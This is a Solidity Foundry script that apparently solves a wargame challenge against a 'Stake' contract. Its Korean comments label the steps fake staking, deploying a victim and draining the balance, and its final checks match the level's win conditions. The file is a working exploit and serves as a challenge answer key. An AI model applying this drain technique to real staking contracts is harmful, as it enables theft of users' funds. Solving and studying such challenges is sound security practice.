// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IStake} from "src/IStake.sol";
import {Victim} from "src/Victim.sol";

contract AttackerScript is Script {

    IStake target;
    IERC20 wETH;

    function setUp() public {
        target = IStake(0xb2AaABC18a6b9faA3625Bf9fbB4f77ff89276aD3);
        wETH = IERC20(0xCd8AF4A0F29cF7966C051542905F66F5dca9052f);
    }

    function run() public {
        vm.startBroadcast();

        // 가짜 스테이킹
        wETH.approve(address(target), 1 ether);
        target.StakeWETH(0.002 ether);
        
        // 금액 맞추기용 피해자 투입
        Victim victim = new Victim(target);
        victim.stake{ value: 0.003 ether }();
        
        // 남은 잔액 털기
        target.Unstake(0.002 ether);

        // 채점통과를 위한 조건들
        require(address(target).balance > 0, "The Stake contract's ETH balance has to be greater than 0");
        require(target.totalStaked() > address(target).balance, "totalStaked must be greater than the Stake contract's ETH balance");
        require(target.Stakers(msg.sender), "You must be a staker");
        require(target.UserStake(msg.sender) == 0, "Your staked balance must be 0");

        vm.stopBroadcast();
    }
}
